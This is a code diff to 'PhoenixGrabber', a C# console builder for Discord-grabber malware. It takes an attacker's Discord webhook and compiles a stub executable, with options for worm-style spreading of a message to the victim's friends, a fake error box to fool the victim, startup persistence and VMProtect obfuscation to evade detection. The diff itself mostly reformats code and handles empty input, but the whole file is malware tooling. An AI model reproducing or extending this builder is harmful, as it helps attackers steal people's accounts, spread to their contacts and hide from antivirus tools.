@@ -29,8 +29,10 @@ namespace PhoenixGrabber
         static void Main()
         {
             Console.Title = "Phoenix Grabber";
+            Console.Clear();
             Console.Write("Discord Webhook: ");
             Webhook = Console.ReadLine();
+            if (string.IsNullOrEmpty(Webhook)) Main();
             Console.Clear();
             Console.WriteLine("Sends your message to all friends.\n");
             Console.Write("Spread Mode (Y/N): ");
@@ -70,6 +72,7 @@ namespace PhoenixGrabber
             Console.Clear();
             Console.Write("File Name: ");
             FileName = Console.ReadLine();
+            if (string.IsNullOrEmpty(FileName)) FileName = "stub";
             Console.Clear();
             Console.WriteLine("Building stub");
             Compile();
@@ -83,19 +86,13 @@ namespace PhoenixGrabber
             stub = stub.Replace("Webhook", Webhook);
 
             if (SpreadMode == true)
-            {
                 stub = stub.Replace("//SpreadMode", $"SpreadMode(\"{WormMessage}\");");
-            }
 
             if (FakeError == true)
-            {
                 stub = stub.Replace("//FakeError", $"MessageBox.Show(\"{FakeErrorMessage}\", \"Error\", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);");
-            }
 
             if (RunOnStartup == true)
-            {
                 stub = stub.Replace("//RunOnStartup", "RunOnStartup();");
-            }
 
             return stub;
         }
@@ -106,39 +103,32 @@ namespace PhoenixGrabber
         {
             string stub = Properties.Resources.Stub;
             stub = Base(stub);
-            List<string> code = new List<string>();
-            code.Add(stub);
+            List<string> code = new List<string>
+            {
+                stub
+            };
             CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
             CompilerParameters compars = new CompilerParameters();
             compars.ReferencedAssemblies.Add("System.dll");
-            compars.ReferencedAssemblies.Add("System.Linq.dll");
             compars.ReferencedAssemblies.Add("System.Windows.Forms.dll");
             compars.ReferencedAssemblies.Add("System.Core.dll");
             compars.ReferencedAssemblies.Add("Microsoft.CSharp.dll");
-            compars.ReferencedAssemblies.Add("System.Security.dll");
-            compars.ReferencedAssemblies.Add(Directory.GetCurrentDirectory() + "\\Newtonsoft.Json.dll");
-            compars.ReferencedAssemblies.Add(Directory.GetCurrentDirectory() + "\\BouncyCastle.Crypto.dll");
+            compars.ReferencedAssemblies.Add("System.Web.Extensions.dll");
             compars.GenerateExecutable = true;
             compars.GenerateInMemory = false;
             compars.TreatWarningsAsErrors = false;
             compars.CompilerOptions += "/t:winexe /unsafe /platform:x86";
             if (FileName.Contains(" ")) { FileName = FileName.Replace(" ", "_"); }
             if (Obfuscate == true)
-            {
                 compars.OutputAssembly = Path.GetTempPath() + $"\\{FileName}.exe";
-            }
             else
-            {
                 compars.OutputAssembly = Directory.GetCurrentDirectory() + $"\\{FileName}.exe";
-            }
             CompilerResults res = provider.CompileAssemblyFromSource(compars, code.ToArray());
             Console.Clear();
             if (res.Errors.Count > 0)
             {
                 foreach (CompilerError error in res.Errors)
-                {
                     Console.WriteLine(error);
-                }
             }
             else
             {
@@ -149,9 +139,7 @@ namespace PhoenixGrabber
                         Console.WriteLine("Obfuscating");
 
                         using (var stream = new FileStream(Path.GetTempPath() + "\\VMProtect_Con.exe", FileMode.Create, FileAccess.Write))
-                        {
                             stream.Write(Properties.Resources.VMProtect_Con, 0, Properties.Resources.VMProtect_Con.Length);
-                        }
 
                         Process p = new Process();
                         p.StartInfo.FileName = "cmd.exe";
